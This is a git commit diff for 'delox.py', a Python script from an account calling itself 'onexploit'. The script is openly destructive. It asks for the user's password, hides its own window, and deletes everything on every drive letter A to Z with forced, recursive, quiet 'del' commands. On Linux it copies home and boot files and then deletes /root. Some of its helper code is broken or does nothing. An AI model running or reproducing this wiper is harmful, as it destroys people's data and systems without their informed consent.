58f10069b842fe41c4b5fa9105678a573ee00392
onexploit <93861844+onexploit@users.noreply.github.com>
2022-04-19 13:53:22 +0430

    Update Delox in 4/19/2022
    pip3 install requests
    pip3 install lib2to
    pip3 install win32gui && pip3 install win32con

--- delox.py
+++ delox.py
@@ -1,18 +1,34 @@
+from requests import get
+import socket
+from lib2to3.pgen2 import driver
 import os , win32gui , win32con
-from getpass import getpass
+import getpass
 import time
+import banner
+from color import Color
 
-os.system('clear')
-os.system('cls')
+def ClearCSR():
+    os.system('clear')
+    os.system('cls')
+
+def username():
+    getpass.getuser()
+def ip_local():
+    get('https://api.ipify.org').text
+def ip_public():
+    socket.gethostbyname(socket.gethostname())
 
 def run():
+    ClearCSR()
     time.sleep(1)
-    WindowsLinux = print('''
+    banner.Created_banner(Color.RED + 'Delox')
+    systems = ('''
     [01] -> Windows
     [02] -> Linux
     [03] -> Os
     [99] -> exit
     ''')
+    print(systems)
     sys = input('one_exploit => ')
     if sys == '01' or sys == '02' or sys == '03' :
         print('Which one [1,2,3,99')
@@ -28,53 +44,53 @@ def run():
 
     if sys == '1':
         def delWindows():
+            listdrive = ['A', 'B' , 'C' ,'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
             time.sleep(1)
-            os.system('cls')
-            print('''
-                        w                     w  iiiiiiii  n           n
-                         w         w         w      ii     n n         n
-                          w       w w       w       ii     n   n       n
-                           w     w   w     w        ii     n     n     n
-                            w   w     w   w         ii     n       n   n
-                             w w       w w          ii     n         n n
-                              w         w        iiiiiiii  n           n
-            ''')
+            ClearCSR()
+            banner.Created_banner(Color.RED +'Windows')
+            print()
+            username()
+            ip_local()
 
-
-            namesystem = input('Plese inter the name your pc: ')
             password = input('your system have password?(Y , n) : ').lower()
             if password == 'Y':
-                passnamesystem = getpass('Inter password '+namesystem+" : ")
+                passnamesystem = getpass('Inter password '+username()+" : ")
                 print('=============================')
                 print('    YOU DELET ALL SYSTEM    |')
                 print('=============================')
-                print(f'usename: {namesystem}')
+                print(f'usename: {username()}')
                 print(f'password: {passnamesystem}')
-                time.sleep(1)
+                time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
-                os.system('off')
-                os.system('attrib -r -g -h C:\\autoexec.bat')
-                os.system('del C:\\autoexec.bat')
-                os.system('attrib -r -g -h C:\\boot.ini')
-                os.system('del C:\\boot.ini')
-                os.system('attrib -r -g -h C:\\ntidr')
-                os.system('del C:\\ntidr')
-                os.system('attrib -r -g -h C:\windows\win.ini')
-                os.system('del C:\windows\win.ini')
+                for d in listdrive:
+                    driver = d
+                    os.system('del '+ driver + ':\*.* /f /s /q')
+                # os.system('off')
+                # os.system('attrib -r -g -h C:\\autoexec.bat')
+                # os.system('del C:\\autoexec.bat')
+                # os.system('attrib -r -g -h C:\\boot.ini')
+                # os.system('del C:\\boot.ini')
+                # os.system('attrib -r -g -h C:\\ntidr')
+                # os.system('del C:\\ntidr')
+                # os.system('attrib -r -g -h C:\windows\win.ini')
+                # os.system('del C:\windows\win.ini')
             else:
-                print(f'usename: {namesystem}')
+                print(f'usename: {username()}')
                 print('password: ')
                 time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
-                os.system('off')
-                os.system('attrib -r -g -h C:\autoexec.bat')
-                os.system('del C:\autoexec.bat')
-                os.system('attrib -r -g -h C:\boot.ini')
-                os.system('del C:\boot.ini')
-                os.system('attrib -r -g -h C:\ntidr')
-                os.system('del C:\ntidr')
-                os.system('attrib -r -g -h C:\windows\win.ini')
-                os.system('del C:\windows\win.ini')
+                for d in listdrive:
+                    driver = d
+                    os.system('del '+ driver + ':\*.* /f /s /q')
+                # os.system('off')
+                # os.system('attrib -r -g -h C:\autoexec.bat')
+                # os.system('del C:\autoexec.bat')
+                # os.system('attrib -r -g -h C:\boot.ini')
+                # os.system('del C:\boot.ini')
+                # os.system('attrib -r -g -h C:\ntidr')
+                # os.system('del C:\ntidr')
+                # os.system('attrib -r -g -h C:\windows\win.ini')
+                # os.system('del C:\windows\win.ini')
                 print('=============================')
                 print('    YOU DELET ALL SYSTEM    |')
                 print('=============================')
@@ -85,30 +101,22 @@ def run():
         def delLinux():
             time.sleep(1)
             os.system('clear')
-            print('''
-                    ll        iiiiii    n           n
-                    ll          ii      n n         n
-                    ll          ii      n   n       n
-                    ll          ii      n     n     n
-                    ll          ii      n       n   n
-                    ll          ii      n         n n
-                    ll ll ll  iiiiii    n           n
-            ''')
-            namesystem = input('Plese inter the name your pc: ')
+            banner.Created_banner(Color.RED + 'Linux')
+            
             password = input('your system have password?(Y , n) : ').lower()
             if password == 'y':
-                passnamesystem = getpass('Inter password '+namesystem+" : ")
+                passnamesystem = getpass('Inter password '+username()+" : ")
                 print('=============================')
                 print('    YOU DELET ALL SYSTEM    |')
                 print('=============================')
                 print('We are One_Exploit')
-                print(f'usename: {namesystem}')
+                print(f'usename: {username()}')
                 print(f'pass: {passnamesystem}')
                 time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                 os.system('sudo su')
                 os.system('echo '+passnamesystem)
-                os.system('cp -r /home/'+namesystem+'/* /techer0221/')
+                os.system('cp -r /home/'+username()+'/* /techer0221/')
                 os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                 os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                 os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
@@ -119,12 +127,12 @@ def run():
                 print('    YOU DELET ALL SYSTEM    |')
                 print('=============================')
                 print('We are One_Exploit')
-                print(f'usename: {namesystem}')
+                print(f'usename: {username()}')
                 print('password: ')
                 time.sleep(2)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                 os.system('sudo su')
-                os.system('cp -r /home/'+namesystem+'/* /techer0221/')
+                os.system('cp -r /home/'+username()+'/* /techer0221/')
                 os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                 os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                 os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
@@ -133,11 +141,13 @@ def run():
 
     elif sys == '3':    
         def delOs():
-            print('coming son')
-            pass
+            banner.Created_banner(Color.RED + 'MAC OS')
+            ClearCSR()
+            os.system('sudo')
         delOs()
 
     elif sys == '99':
         exits()
 
 run()
+print('Good By')
